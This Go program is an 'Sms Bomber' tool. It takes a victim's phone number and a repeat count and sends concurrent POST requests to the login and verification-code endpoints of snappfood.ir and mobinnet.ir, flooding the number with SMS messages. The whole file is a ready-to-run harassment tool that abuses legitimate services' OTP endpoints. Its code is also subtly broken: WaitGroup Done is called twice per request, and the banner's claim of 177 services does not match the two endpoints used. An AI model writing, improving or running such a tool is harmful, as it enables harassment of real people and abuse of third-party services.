package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io" // Import for reading response body
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	// time is no longer strictly needed without proxy timeouts or specific delays
	"sync"
)

// clearScreen clears the terminal screen based on the operating system.
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

// sendJSONRequest sends an HTTP POST request with a JSON payload.
// It uses a context for cancellation, a WaitGroup for synchronization,
// and a channel to report the request status and response body info.
// It uses the default http.Client.
func sendJSONRequest(ctx context.Context, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- string) {
	defer wg.Done()

	jsonData, err := json.Marshal(payload)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while encoding JSON!\033[0m")
		ch <- fmt.Sprintf("ERROR: JSON encoding failed for %s", url)
		return
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while creating request to", url, "!\033[0m", err)
		ch <- fmt.Sprintf("ERROR: Request creation failed for %s: %v", url, err)
		return
	}
	req.Header.Set("Content-Type", "application/json")

	// Use the default HTTP client
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
		ch <- fmt.Sprintf("ERROR: Request failed for %s: %v", url, err)
		return
	}
	defer resp.Body.Close()

	// --- Response Body Management ---
	bodyBytes, readErr := io.ReadAll(resp.Body)
	bodyString := string(bodyBytes)
	if readErr != nil {
		fmt.Printf("\033[01;31m[-] Error reading response body for %s: %v\033[0m\n", url, readErr)
		// Report status code and a note about body read error
		ch <- fmt.Sprintf("STATUS %d (Body read error for %s)", resp.StatusCode, url)
		return
	}

	// Simple check based on status code and body content (can be expanded)
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		// Successful status code range
		// You might want to parse the bodyString here for more detailed success/error messages
		// For now, just report success with status code and a snippet of the body
		ch <- fmt.Sprintf("SENT: %s (Status: %d, Body Snippet: %.50s...)", url, resp.StatusCode, bodyString)
	} else if resp.StatusCode == 404 || resp.StatusCode == 400 {
		// Specific error codes like in the original code
		ch <- fmt.Sprintf("ERROR: %s (Status: %d, Body: %s)", url, resp.StatusCode, bodyString)
	} else {
		// Other status codes (e.g., 500 Internal Server Error, 429 Too Many Requests)
		ch <- fmt.Sprintf("WARNING: %s (Status: %d, Body: %s)", url, resp.StatusCode, bodyString)
	}
	// --- End Response Body Management ---
}

// sendFormRequest sends an HTTP POST request with a form-urlencoded payload.
// It uses a context for cancellation, a WaitGroup for synchronization,
// and a channel to report the request status and response body info.
// It uses the default http.Client.
func sendFormRequest(ctx context.Context, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- string) {
	defer wg.Done()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while creating form request to", url, "!\033[0m", err)
		ch <- fmt.Sprintf("ERROR: Request creation failed for %s: %v", url, err)
		return
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	// Use the default HTTP client
	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		fmt.Println("\033[01;31m[-] Error while sending request to", url, "!", err)
		ch <- fmt.Sprintf("ERROR: Request failed for %s: %v", url, err)
		return
	}
	defer resp.Body.Close()

	// --- Response Body Management ---
	bodyBytes, readErr := io.ReadAll(resp.Body)
	bodyString := string(bodyBytes)
	if readErr != nil {
		fmt.Printf("\033[01;31m[-] Error reading response body for %s: %v\033[0m\n", url, readErr)
		// Report status code and a note about body read error
		ch <- fmt.Sprintf("STATUS %d (Body read error for %s)", resp.StatusCode, url)
		return
	}

	// Simple check based on status code and body content (can be expanded)
	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		// Successful status code range
		// You might want to parse the bodyString here for more detailed success/error messages
		// For now, just report success with status code and a snippet of the body
		ch <- fmt.Sprintf("SENT: %s (Status: %d, Body Snippet: %.50s...)", url, resp.StatusCode, bodyString)
	} else if resp.StatusCode == 404 || resp.StatusCode == 400 {
		// Specific error codes like in the original code
		ch <- fmt.Sprintf("ERROR: %s (Status: %d, Body: %s)", url, resp.StatusCode, bodyString)
	} else {
		// Other status codes (e.g., 500 Internal Server Error, 429 Too Many Requests)
		ch <- fmt.Sprintf("WARNING: %s (Status: %d, Body: %s)", url, resp.StatusCode, bodyString)
	}
	// --- End Response Body Management ---
}

// savePhoneNumberToFile function is removed as requested.
// func savePhoneNumberToFile(phone string, filename string) error { ... }


func main() {
	clearScreen()

	// --- ASCII Banner with Colors ---
	fmt.Print("\033[01;32m") // Top (green)
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m") // Middle (white)
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
             *@@%#            -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
              :@@*           =%@@@@@@%-   faster   *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m") // Bottom (red)
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m") // Reset color
	// --- End of ASCII Banner ---

	// Service introduction messages and input prompts (like smstest.go)
	fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m177 \n\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n")
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	// --- Save Phone Number section removed as requested ---
	// phoneNumberFile := "used_phone_numbers.txt"
	// if err := savePhoneNumberToFile(phone, phoneNumberFile); err != nil {
	// 	fmt.Printf("\033[01;31m[-] Warning: Could not save phone number to %s: %v\033[0m\n", phoneNumberFile, err)
	// } else {
	// 	fmt.Printf("\033[01;32m[+] Phone number saved to %s\033[0m\n", phoneNumberFile)
	// }
	// --- End Save Phone Number section removed ---


	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	// Use the default HTTP client (no proxy)
	// httpClient := &http.Client{} // No longer needed as we use http.DefaultClient directly

	// Setup context for cancellation and signal handling for graceful shutdown (Ctrl+C)
	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, os.Interrupt)
	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m") // Interrupt message with error-like color
		cancel() // Cancel the context
	}()

	var wg sync.WaitGroup
	// Create a buffered channel to receive string messages about request status.
	ch := make(chan string, repeatCount*2) // Buffer size is repeatCount * 2

	// Loop to send requests concurrently
	for i := 0; i < repeatCount; i++ {
		// Launch Goroutine for Snappfood form request
		wg.Add(1) // Increment WaitGroup counter
		go func(p string) { // Pass phone value to Goroutine
			defer wg.Done() // Decrement WaitGroup counter when this Goroutine finishes
			formData := url.Values{}
			formData.Set("cellphone", p)
			// Use http.DefaultClient directly
			sendFormRequest(ctx, "https://snappfood.ir/mobile/v4/user/loginMobileWithNoPass?lat=35.774&long=51.418", formData, &wg, ch)
		}(phone) // Pass the current value of phone to the anonymous function

		// Launch Goroutine for Mobinnet JSON request
		wg.Add(1) // Increment WaitGroup counter
		go func(p string) { // Pass phone value to Goroutine
			defer wg.Done() // Decrement WaitGroup counter when this Goroutine finishes
			// Use http.DefaultClient directly
			sendJSONRequest(ctx, "https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{"cellNumber": p}, &wg, ch)
		}(phone) // Pass the current value of phone to the anonymous function
	}

	// Goroutine to wait for all requests to complete and then close the channel.
	go func() {
		wg.Wait() // Wait for all Goroutines in the WaitGroup to finish
		close(ch) // Close the channel when all Goroutines are done
	}()

	// Read results from the channel until it is closed and print them.
	for resultMsg := range ch {
		fmt.Println(resultMsg) // Print the detailed result message
	}

	// The final "All requests processed." message is still omitted to match smstest.go style.
}
